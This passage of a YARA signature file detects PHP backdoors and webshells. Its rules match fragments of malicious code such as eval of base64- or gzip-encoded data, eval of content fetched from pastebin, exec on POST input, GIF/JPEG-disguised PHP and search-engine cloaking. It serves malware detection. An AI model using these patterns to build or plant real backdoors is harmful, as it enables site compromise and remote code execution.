        $trigger and PR01801 and PR02115
}

rule php_backdoor_fakeGIF_004_02 : backdoor
{
    strings:
        $trigger = "eval(stripslashes(gzinflate(base64_decode("
    condition:
        $trigger and PR02115
}

private rule PR02116 : trigger
{
    strings:
        $ps0 = "))); die; }else{ eval(gzinflate(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_fakeGIF_004_03 : backdoor
{
    strings:
        $trigger = "GIF89"
    condition:
        $trigger and PR02116
}

rule php_backdoor_fakeGIF_005 : backdoor
{
    strings:
        $trigger = "GIF89"
    condition:
        $trigger and PR01801 and PR01746
}

private rule PR02117 : trigger
{
    strings:
        $ps0 = "$str=array($send, $IWP); foreach ($str as $send)"
    condition:
        $ps0
}

rule php_backdoor_fakeGIF_006 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR02117 and PR00029 and PR02115
}

private rule PR02118 : trigger
{
    strings:
        $ps0 = "md5 Password"
    condition:
        $ps0
}

rule php_backdoor_fakeGIF_007 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR02118 and PR00029 and PR02115
}

rule php_backdoor_fakeGIF_007_01 : backdoor
{
    strings:
        $trigger = "$sh_id = "
    condition:
        $trigger and PR00029 and PR02115 and PR01436
}

rule php_backdoor_fakeGIF_008 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode($"
    condition:
        $trigger and PR02115 and PR01436
}

// MANUAL FIX NECESSARY
rule php_backdoor_fakeGIF_009 : backdoor
{
    strings:
        $trigger = "GIF8"
        $php_backdoor_fakeGIF_009_r0 = /\AGIF[^\n]+\s*<.[Pp][Hh][Pp]/
    condition:
        $trigger and $php_backdoor_fakeGIF_009_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_fakeJPG_001 : backdoor
{
    strings:
        $trigger = ">"
        $php_backdoor_fakeJPG_001_r0 = /\x10JFIF/
        $php_backdoor_fakeJPG_001_w1 = "<?php die('Execution denied!');"
        $php_backdoor_fakeJPG_001_r2 = /<\?[pP][hH][pP]/
    condition:
        $trigger and $php_backdoor_fakeJPG_001_r0 and not $php_backdoor_fakeJPG_001_w1 and $php_backdoor_fakeJPG_001_r2
}

rule php_backdoor_fakewpbackup_001 : backdoor
{
    strings:
        $trigger = "class WP_Backup"
    condition:
        $trigger and PR00435 and PR00917
}

rule php_backdoor_fallagateam_001 : backdoor
{
    strings:
        $trigger = "echo '<b><br>uname:'.php_uname().'<br></b>fallagateam"
    condition:
        $trigger
}

rule php_backdoor_fatalshell_001 : backdoor
{
    strings:
        $trigger = ").' - FaTaL Shell v"
    condition:
        $trigger
}

rule php_backdoor_FathurFreakz_001 : backdoor
{
    strings:
        $trigger = "<?php /*/ Encode By FathurFreakz /*/ @error_reporting(0)"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_008 : backdoor
{
    strings:
        $trigger = "eval(@file_get_contents(@$_GET"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_009 : backdoor
{
    strings:
        $trigger = "fwrite($new_v_file,\"\\$xred=base64_decode('$new_url');\\n\"); }"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_009_02 : backdoor
{
    strings:
        $trigger = "if ($else_dot==1) {$new_v_f=fopen(\"$f_creat_name\",\"w+\");}"
    condition:
        $trigger and PR00732
}

private rule PR02119 : trigger
{
    strings:
        $ps0 = "$url = htmlspecialchars(trim($_GET['url']));"
    condition:
        $ps0
}

private rule PR02120 : trigger
{
    strings:
        $ps0 = "$source = file_get_contents($dn);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_010 : backdoor
{
    strings:
        $trigger = "$dn=($url).($patch);"
    condition:
        $trigger and PR02119 and PR02120
}

rule php_backdoor_file_get_contents_010_02 : backdoor
{
    strings:
        $trigger = "background: url('http://i41.tinypic.com/ibkmd5.png') repeat scroll 0 0 #"
    condition:
        $trigger
}

private rule PR02121 : trigger
{
    strings:
        $ps0 = "echo '2';"
    condition:
        $ps0
}

private rule PR02122 : trigger
{
    strings:
        $ps0 = ".php', 'w') ) {"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_011 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02121 and PR00355 and PR02122 and PR00357
}

private rule PR02123 : trigger
{
    strings:
        $ps0 = "if (strlen($file_contents) < 10 && function_exists('curl_init"
    condition:
        $ps0
}

private rule PR02124 : trigger
{
    strings:
        $ps0 = "(isset($_GET['do']))"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_013 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02123 and PR02124
}

// MANUAL FIX NECESSARY
rule php_backdoor_file_get_contents_014 : backdoor
{
    strings:
        $trigger = "{echo \"http://\".$_SERVER['HTTP_HOST'].\"/"
        $php_backdoor_file_get_contents_014_r0 = /file_put_contents\(\$path,(file_get_contents|get_url_con)\(\"http/
    condition:
        $trigger and PR00203 and $php_backdoor_file_get_contents_014_r0
}

rule php_backdoor_file_get_contents_015 : backdoor
{
    strings:
        $trigger = "$_REQUEST[\"content\"];} }if( $extention == \"php\"){ if (isset($_REQUEST[\"overwrite\"])){file_put_contents($"
    condition:
        $trigger
}

private rule PR02125 : trigger
{
    strings:
        $ps0 = "oogle')!== false||strpos($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_016 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR02125 and PR01021 and PR01431
}

private rule PR02126 : trigger
{
    strings:
        $ps0 = "Q2k4cUNpQXFJRkpGVmtsVFNVOU9Pa"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_018 : backdoor
{
    strings:
        $trigger = "($qo8("
    condition:
        $trigger and PR02126 and PR00029 and PR00634
}

rule php_backdoor_file_get_contents_019 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('s7ezsS/IKODlSi1LzNFIy8xJj"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_020 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('DcxBCoAgEAXQveA50o3uK/IoIjLqgIySn+j49Q7wwnWG2aZW9KRuCneKlRDzEJBgma0Bc/"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_021 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('lZzNriQ7EYT3SLzDaHQXsLk6VXbaXbriT"
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_022 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('TVfHDsRIbv2XuaxtGV"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02127 : trigger
{
    strings:
        $ps0 = "$auth_pass"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_023 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_get_contents_023_r0 = /\$auth_pass\s*=\s*.\w+.\s*;\s*\$\w+\s*=\s*file_get_contents\([^\)]+\)\s*;\s*eval\(\$\w+\)\s*;/
    condition:
        $trigger and PR01350 and PR02127 and $php_backdoor_file_get_contents_023_r0
}

private rule PR02128 : trigger
{
    strings:
        $ps0 = "echo \"error"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_024 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR02128 and PR00357
}

rule php_backdoor_file_get_contents_025 : backdoor
{
    strings:
        $trigger = "@eval(@file_get_contents("
    condition:
        $trigger
}

rule php_backdoor_file_get_contents_026 : backdoor
{
    strings:
        $trigger = "php\",file_get_contents(\"http"
    condition:
        $trigger and PR00435
}

private rule PR02129 : trigger
{
    strings:
        $ps0 = "if (file_put_contents("
    condition:
        $ps0
}

private rule PR02130 : trigger
{
    strings:
        $ps0 = "php\",file_get_contents(\"http"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_026_02 : backdoor
{
    strings:
        $trigger = "unlink(__FILE__);"
    condition:
        $trigger and PR02129 and PR02130
}

rule php_backdoor_file_get_contents_027 : backdoor
{
    strings:
        $trigger = "eval(file_get_contents(\"http://pastebin"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02131 : trigger
{
    strings:
        $ps0 = ".txt\";"
    condition:
        $ps0
}

private rule PR02132 : trigger
{
    strings:
        $ps0 = "header(\"Content-type:"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_028 : backdoor
{
    strings:
        $trigger = "eval($"
        $php_backdoor_file_get_contents_028_r0 = /txt\";[\s]*\$[\w]+[\s]*=[\s]*@file_get_contents[^;]+;[\s]*eval/
    condition:
        $trigger and PR02131 and PR02132 and PR01607 and $php_backdoor_file_get_contents_028_r0
}

rule php_backdoor_file_get_contents_029 : backdoor
{
    strings:
        $trigger = "ZWNobyBmaWxlX2dldF9jb250ZW50cygiaHR0c"
    condition:
        $trigger and PR01398
}

rule php_backdoor_file_get_contents_030 : backdoor
{
    strings:
        $trigger = "file_put_contents(@$_SERVER["
    condition:
        $trigger
}

private rule PR02133 : trigger
{
    strings:
        $ps0 = "echo '<pre>'.file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_031 : backdoor
{
    strings:
        $trigger = "base64_decode($_REQUEST["
    condition:
        $trigger and PR02133
}

rule php_backdoor_file_get_contents_032 : backdoor
{
    strings:
        $trigger = "QHByZWdfcmVwbGFjZSgiL1twYWdlZ"
    condition:
        $trigger and PR01398
}

private rule PR02134 : trigger
{
    strings:
        $ps0 = "file_put_contents($sname,$result);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_033 : backdoor
{
    strings:
        $trigger = "x_iso"
    condition:
        $trigger and PR02134
}

rule php_backdoor_file_get_contents_034 : backdoor
{
    strings:
        $trigger = "find_secret_dir($root)"
    condition:
        $trigger and PR01431
}

private rule PR02135 : trigger
{
    strings:
        $ps0 = "if(wp_admin_bar_dl(\"http"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_036 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02135
}

// MANUAL FIX NECESSARY
rule php_backdoor_file_get_contents_037 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_get_contents_037_r0 = /header\([^$]+\$[\w]+=base64_decode\([^;]+\);\$[\w]+[\s]*=[\s]*\@file_get_contents\(\$[\w]+\);/
    condition:
        $trigger and PR01350 and $php_backdoor_file_get_contents_037_r0
}

private rule PR02136 : trigger
{
    strings:
        $ps0 = "$php); eval($php); } function curl("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_038 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02136
}

rule php_backdoor_file_get_contents_039 : backdoor
{
    strings:
        $trigger = "@eval(file_get_contents(\"http"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_file_get_contents_040 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_file_get_contents_040_r0 = /header\(.Content-type[^;]+;[\s]*\$[\w]+[\s]*=[\s]*isset\(\$_GET\[.[\w]+.\]\)\?\$_GET\[.[\w]+.\]:[^\}]+\}[\s]*else[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*isset\(\$_GET\[[^@]+@[\s]*\$data[\s]*=[\s]*file_get_contents\(\$[\w]+\);[^\}]+exit\(\);[\s]*\}/
    condition:
        $trigger and PR01428 and PR01431 and $php_backdoor_file_get_contents_040_r0
}

private rule PR02137 : trigger
{
    strings:
        $ps0 = "base64_decode(base64_decode(\"YUhSMGNEb3ZMM"
    condition:
        $ps0
}

private rule PR02138 : trigger
{
    strings:
        $ps0 = "if (function_exists('fsockopen')) {"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_041 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR02137 and PR02138 and PR00357
}

private rule PR02139 : trigger
{
    strings:
        $ps0 = "\\x66\\x69\\x6c\\x65\\x5f\\x67\\x65\\x74\\x5f\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_042 : backdoor
{
    strings:
        $trigger = "var_dump($_REQUEST["
    condition:
        $trigger and PR02139
}

rule php_backdoor_file_get_contents_043 : backdoor
{
    strings:
        $trigger = "Q0Kew0KZGVmaW5lKCduZXdvODNmMzJmM3Nmc3BvamFwOTItMDMyamc0MycsIDE"
    condition:
        $trigger and PR01398
}

private rule PR02140 : trigger
{
    strings:
        $ps0 = "pkill -9 -f stealth"
    condition:
        $ps0
}

private rule PR02141 : trigger
{
    strings:
        $ps0 = "unlink("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_044 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02140 and PR01021 and PR02141
}

private rule PR02142 : trigger
{
    strings:
        $ps0 = "/ID3/module.dat"
    condition:
        $ps0
}

private rule PR02143 : trigger
{
    strings:
        $ps0 = "curl_exec"
    condition:
        $ps0
}

private rule PR02144 : trigger
{
    strings:
        $ps0 = "FILE_APPEND"
    condition:
        $ps0
}

private rule PR02145 : trigger
{
    strings:
        $ps0 = "<= 77700 || filesize"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_045 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02142 and PR02143 and PR02144 and PR02145
}

private rule PR02146 : trigger
{
    strings:
        $ps0 = "://pastebin.com/raw"
    condition:
        $ps0
}

private rule PR02147 : trigger
{
    strings:
        $ps0 = "eval(str_rot13(gzinflate(str_rot13(base64_decode(($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_046 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02146 and PR02147
}

private rule PR02148 : trigger
{
    strings:
        $ps0 = "file_get_contents(__DIR__"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_048 : backdoor
{
    strings:
        $trigger = "base64_decode(zlib_decode($"
    condition:
        $trigger and PR00029 and PR02148
}

private rule PR02149 : trigger
{
    strings:
        $ps0 = "fwrite(fopen("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_049 : backdoor
{
    strings:
        $trigger = "w+),file_get_contents(http"
    condition:
        $trigger and PR02149
}

private rule PR02150 : trigger
{
    strings:
        $ps0 = "exec($_POST["
    condition:
        $ps0
}

private rule PR02151 : trigger
{
    strings:
        $ps0 = "$suffixes[floor($base)];}function max_file_upload_in_bytes()"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_050 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02150 and PR02151
}

// MANUAL FIX NECESSARY
rule php_backdoor_file_get_contents_051 : backdoor
{
    strings:
        $trigger = "explode("
        $php_backdoor_file_get_contents_051_r0 = /\$[\w]+[\s]*=[\s]*(file_get_contents\()?.http[^;]+\)?;[\s]*\$[\w]+[\s]*=[^\|]explode\([^\(]+header\(.Location:[^;]+\);/
    condition:
        $trigger and PR00431 and PR01431 and $php_backdoor_file_get_contents_051_r0
}

rule php_backdoor_file_get_contents_052 : backdoor
{
    strings:
        $trigger = "))!=hash('sha1',file_get_contents($"
    condition:
        $trigger and PR01571 and PR01468
}

// MANUAL FIX NECESSARY
private rule PR02152 : trigger
{
    strings:
        $ps0 = "pastebin"
    condition:
        $ps0
}

private rule PR02153 : trigger
{
    strings:
        $ps0 = "w') or die("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_054 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_get_contents_054_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR02152 and PR02153 and PR00357 and $php_backdoor_file_get_contents_054_r0
}

private rule PR02154 : trigger
{
    strings:
        $ps0 = "&& (strpos($_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

private rule PR02155 : trigger
{
    strings:
        $ps0 = "echo file_"
    condition:
        $ps0
}

private rule PR02156 : trigger
{
    strings:
        $ps0 = "($_SERVER['REQUEST_URI'] == '/')"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_055 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02154 and PR02155 and PR02156
}

private rule PR02157 : trigger
{
    strings:
        $ps0 = "function _doEvil($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_056 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02157 and PR00357
}

// MANUAL FIX NECESSARY
private rule PR02158 : trigger
{
    strings:
        $ps0 = "iconv("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_057 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_file_get_contents_057_r0 = /file_get_contents\(\$[\w]+\([^;]+\)\);[\s]*\$[\w]+[\s]*=[\s]*iconv\(/
    condition:
        $trigger and PR02158 and PR01431 and $php_backdoor_file_get_contents_057_r0
}

private rule PR02159 : trigger
{
    strings:
        $ps0 = "preg_replace('/[^0-9A-Za-z]/', '', $_REQUEST['id']); if (!empty($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_058 : backdoor
{
    strings:
        $trigger = "@unserialize(@file_get_contents("
    condition:
        $trigger and PR02159
}

private rule PR02160 : trigger
{
    strings:
        $ps0 = ".= substr(pack('H"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_059 : backdoor
{
    strings:
        $trigger = "google|bing|yandex"
    condition:
        $trigger and PR01428 and PR01021 and PR02160 and PR01431
}

private rule PR02161 : trigger
{
    strings:
        $ps0 = "f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_060 : backdoor
{
    strings:
        $trigger = "is_file("
    condition:
        $trigger and PR02161
}

private rule PR02162 : trigger
{
    strings:
        $ps0 = "file_get_contents_utf8(\"\\x68\\x74\\x74\\x70"
    condition:
        $ps0
}

private rule PR02163 : trigger
{
    strings:
        $ps0 = "HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_061 : backdoor
{
    strings:
        $trigger = "mb_convert_encoding($"
    condition:
        $trigger and PR02162 and PR02163
}

rule php_backdoor_file_get_contents_062 : backdoor
{
    strings:
        $trigger = "JGxpSFlrbj0iQk9Md0t0dVdZeHNqcnBnSGxKVVB"
    condition:
        $trigger and PR01756
}

// MANUAL FIX NECESSARY
private rule PR02164 : trigger
{
    strings:
        $ps0 = "print("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_063 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_get_contents_063_r0 = /file_put_contents\(.{3,},file_get_contents\(.https?:..[\w]+\.[^;]+\)\);[\s]*print\([^(]+unlink\(/
    condition:
        $trigger and PR02164 and $php_backdoor_file_get_contents_063_r0
}

private rule PR02165 : trigger
{
    strings:
        $ps0 = "base64_decode($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_064 : backdoor
{
    strings:
        $trigger = "@(array)unserialize($this->getImageDecodedText(file_get_contents($"
    condition:
        $trigger and PR01021 and PR02165
}

private rule PR02166 : trigger
{
    strings:
        $ps0 = "unlink(md5($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_065 : backdoor
{
    strings:
        $trigger = "file_put_contents(md5($"
    condition:
        $trigger and PR02166 and PR00391 and PR00392
}

private rule PR02167 : trigger
{
    strings:
        $ps0 = "var_dump(filesize($"
    condition:
        $ps0
}

private rule PR02168 : trigger
{
    strings:
        $ps0 = "is_writable ($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_066 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02167 and PR01468 and PR02168
}

private rule PR02169 : trigger
{
    strings:
        $ps0 = "str_replace(\"/wp-includes\", \"\", dirname(__FILE__));"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_067 : backdoor
{
    strings:
        $trigger = "copy(dirname(__FILE__) . \"/htaccess"
    condition:
        $trigger and PR02169 and PR01431
}

private rule PR02170 : trigger
{
    strings:
        $ps0 = "<title>Search Script</title>"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_068 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02170 and PR01431
}

private rule PR02171 : trigger
{
    strings:
        $ps0 = "substr(md5(microtime()), -$"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_069 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02169 and PR02171
}

// MANUAL FIX NECESSARY
private rule PR02172 : trigger
{
    strings:
        $ps0 = "$doit = fopen("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_070 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_get_contents_070_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR02172 and PR00355 and PR02152 and $php_backdoor_file_get_contents_070_r0
}

private rule PR02173 : trigger
{
    strings:
        $ps0 = "file_put_contents(\"./wp-config.php\", $ok);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_071 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02173 and PR01431
}

private rule PR02174 : trigger
{
    strings:
        $ps0 = "DVZFrsQIkj1OV8kLM2nUCzMze"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_073 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02174
}

private rule PR02175 : trigger
{
    strings:
        $ps0 = "strpos($file->getFilename(),'.js') == true)"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_075 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR02175 and PR01468
}

private rule PR02176 : trigger
{
    strings:
        $ps0 = "@wp_remote_get($url, array("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_076 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR01569 and PR02176 and PR01431
}

private rule PR02177 : trigger
{
    strings:
        $ps0 = "${chr(95).chr(71).chr(69).chr(84)}[chr(65).chr(82).chr(82).chr(65).chr(89)]);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_077 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01422 and PR02177
}

private rule PR02178 : trigger
{
    strings:
        $ps0 = "${chr(95).chr(71).chr(69).chr(84)}[chr(65).chr(82).chr(82).chr(65).chr(89)]"
    condition:
        $ps0
}

private rule PR02179 : trigger
{
    strings:
        $ps0 = "session_start();"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_077_02 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02178 and PR01422 and PR02179
}

rule php_backdoor_file_get_contents_077_03 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01392 and PR02178 and PR01422
}

private rule PR02180 : trigger
{
    strings:
        $ps0 = "set_time_limit(0);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_077_04 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02178 and PR02180 and PR01422
}

private rule PR02181 : trigger
{
    strings:
        $ps0 = "@ini_set("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_077_05 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02181 and PR02178 and PR01422
}

private rule PR02182 : trigger
{
    strings:
        $ps0 = "header('Content-Type: text/html; charset=utf-8');"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_077_06 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02178 and PR01422 and PR02182
}

rule php_backdoor_file_get_contents_078 : backdoor
{
    strings:
        $trigger = "=\"?>\".file_get_contents"
    condition:
        $trigger and PR01350
}

private rule PR02183 : trigger
{
    strings:
        $ps0 = "aWYobWQ1KCRfUE9T"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_079 : backdoor
{
    strings:
        $trigger = "ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVF"
    condition:
        $trigger and PR02183
}

private rule PR02184 : trigger
{
    strings:
        $ps0 = "IyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_081 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02149 and PR02184
}

private rule PR02185 : trigger
{
    strings:
        $ps0 = "if(stristr(@file_get_contents($"
    condition:
        $ps0
}

private rule PR02186 : trigger
{
    strings:
        $ps0 = ");define('BASE_PATH',str_ireplace($_SERVER[$"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_082 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR02185 and PR02186
}

private rule PR02187 : trigger
{
    strings:
        $ps0 = "$g($b"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_083 : backdoor
{
    strings:
        $trigger = "/**/eval/**/"
    condition:
        $trigger and PR02187
}

private rule PR02188 : trigger
{
    strings:
        $ps0 = "$dat = super_exec(\"curl $url\");"
    condition:
        $ps0
}

private rule PR02189 : trigger
{
    strings:
        $ps0 = "$url = BACK_HOST . \"/\" . $rnd"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_084 : backdoor
{
    strings:
        $trigger = "$dat = @file_get_contents($url);"
    condition:
        $trigger and PR00029 and PR00507 and PR02188 and PR02189
}

private rule PR02190 : trigger
{
    strings:
        $ps0 = "$_GET;$_[1]($_[2]);exit;}"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_085 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01780 and PR01468 and PR02190
}

private rule PR02191 : trigger
{
    strings:
        $ps0 = ",file_get_contents(base64_decode(\"aHR0cDovL2"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_087 : backdoor
{
    strings:
        $trigger = "file_put_contents("
    condition:
        $trigger and PR02191
}

private rule PR02192 : trigger
{
    strings:
        $ps0 = "sleep(is_numeric($argv["
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_088 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02192
}

private rule PR02193 : trigger
{
    strings:
        $ps0 = "@file_put_contents($infile,file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_089 : backdoor
{
    strings:
        $trigger = "!file_exists($"
    condition:
        $trigger and PR02193
}

private rule PR02194 : trigger
{
    strings:
        $ps0 = "if(md5($"
    condition:
        $ps0
}

private rule PR02195 : trigger
{
    strings:
        $ps0 = "@chmod($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_090 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02194 and PR02195
}

private rule PR02196 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];"
    condition:
        $ps0
}

private rule PR02197 : trigger
{
    strings:
        $ps0 = "false, stream_context_create($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_091 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02092 and PR01428 and PR01021 and PR02196 and PR02197
}

private rule PR02198 : trigger
{
    strings:
        $ps0 = "(file_exists(\"./\".$_FILES["
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_092 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00046 and PR01468 and PR02198
}

private rule PR02199 : trigger
{
    strings:
        $ps0 = "= filemtime($"
    condition:
        $ps0
}

private rule PR02200 : trigger
{
    strings:
        $ps0 = "if (md5_file($"
    condition:
        $ps0
}

private rule PR02201 : trigger
{
    strings:
        $ps0 = "0444);"
    condition:
        $ps0
}

private rule PR02202 : trigger
{
    strings:
        $ps0 = ".png';"
    condition:
        $ps0
}

private rule PR02203 : trigger
{
    strings:
        $ps0 = "@chmod("
    condition:
        $ps0
}

private rule PR02204 : trigger
{
    strings:
        $ps0 = ") == md5_file($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_093 : backdoor
{
    strings:
        $trigger = "= @file_get_contents($"
    condition:
        $trigger and PR02199 and PR00203 and PR02200 and PR02201 and PR02202 and PR02203 and PR02204 and PR00205
}

private rule PR02205 : trigger
{
    strings:
        $ps0 = "eval(str_rot13(gzinflate(str_rot13(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_094 : backdoor
{
    strings:
        $trigger = "LUjHDuw4Dvyawby9OQfMydlh52"
    condition:
        $trigger and PR02205
}

private rule PR02206 : trigger
{
    strings:
        $ps0 = "unlink($"
    condition:
        $ps0
}

private rule PR02207 : trigger
{
    strings:
        $ps0 = "sys_get_temp_dir();"
    condition:
        $ps0
}

private rule PR02208 : trigger
{
    strings:
        $ps0 = "file_"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_095 : backdoor
{
    strings:
        $trigger = "));require($"
    condition:
        $trigger and PR02206 and PR02207 and PR02208
}

rule php_backdoor_file_get_contents_096 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR01594
}

private rule PR02209 : trigger
{
    strings:
        $ps0 = "PHP_EOL . $str, FILE_APPEND);"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_097 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02209 and PR01468 and PR01899
}

rule php_backdoor_file_get_contents_099 : backdoor
{
    strings:
        $trigger = "); eval(base64_decode($"
    condition:
        $trigger and PR02062
}

private rule PR02210 : trigger
{
    strings:
        $ps0 = ", hexdec(substr($"
    condition:
        $ps0
}

